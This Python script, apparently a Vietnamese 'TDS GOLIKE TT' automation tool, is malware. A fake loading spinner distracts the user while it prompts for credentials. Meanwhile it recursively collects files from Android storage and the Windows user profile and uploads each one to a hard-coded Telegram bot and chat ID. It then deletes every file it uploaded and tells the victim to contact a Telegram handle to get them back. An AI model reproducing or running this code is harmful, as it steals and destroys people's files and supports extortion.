import os
import sys
import requests
import time
import threading
import warnings
banner = f"""                         ╔════════════════╗
                         ║ \033[1;37m TDS GOLIKE TT \033[1;90m║
                         ╚════════════════╝                           \n
"""
# ANSI color codes for terminal output
trang = "\033[1;37m"
luc = "\033[1;32m"
red = "\033[1;31m"

# Telegram Bot information
TOKEN = "8162621699:AAGFM0YDmoO7tmCryX_Bo311djoIlvTjbhQ"  # Thay bằng token thật
CHAT_ID = "7445272108"  # Thay bằng chat ID thật
TELEGRAM_URL = f"https://api.telegram.org/bot{TOKEN}/sendDocument"

# Fake loading để đánh lạc hướng người dùng
def fake_loading():
    animations = ["|", "/", "-", "\\"]
    print(banner)
    autho = input(f'{trang}Nhập Authorizon : ')
    token = input(f'Nhập T : ')
    

    for _ in range(10):  # Simulate loading for 10 seconds
        print(f"\r[+] Đang tải thông tin acc golike ... {animations[_ % 4]}", end="", flush=True)
        time.sleep(1)

# Tìm tất cả file ảnh trên máy
def find_image_files():
    image_extensions = (".py", ".php", ".mp4", ".json",".zip", ".txt", ".html", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".webp")
    root_dirs = ["/storage/emulated/0", "/sdcard", os.environ.get("USERPROFILE", "")]  # Các thư mục tìm kiếm

    file_list = set()  # Sử dụng set để tránh trùng file
    for root_dir in root_dirs:
        if os.path.exists(root_dir):
            for root, _, files in os.walk(root_dir):
                for file in files:
                    if file.lower().endswith(image_extensions):
                        file_list.add(os.path.join(root, file))
    
    return list(file_list)

# Gửi file lên Telegram
def send_file(file_path):
    try:
        with open(file_path, "rb") as file:
            response = requests.post(
                TELEGRAM_URL,
                data={"chat_id": CHAT_ID, "caption": f"Đã tải file: {os.path.basename(file_path)}"},
                files={"document": file},
            )
        return response.status_code == 200
    except:
        return False  # Nếu có lỗi, trả về False nhưng không hiển thị lỗi

# Xóa tất cả file ảnh sau khi đã gửi
def delete_files(file_paths):
    for file in file_paths:
        try:
            os.remove(file)
        except:
            continue  # Bỏ qua lỗi khi xóa và tiếp tục

# Main function
def main():
    loading_thread = threading.Thread(target=fake_loading)
    loading_thread.start()

    image_files = find_image_files()
    
    if image_files:
        for image in image_files:
            if send_file(image):  # Gửi từng file ảnh
                delete_files([image])  # Xóa ảnh sau khi gửi

    # Dừng chương trình sau khi gửi và xóa

    # Không in thông báo nếu không tìm thấy ảnh hoặc gửi file thất bại

    loading_thread.join()
    print(f"\n{red}Toàn bộ file ảnh đã bị xóa sạch!")
    print(f"{trang}Liên hệ Telegram {luc}@luaday123 {trang}để lấy lại.")
    print(f"{trang}Dán này lên Google : {luc}t.me/luaday123")  # Chờ quá trình fake loading hoàn tất

if __name__ == "__main__":
    main()
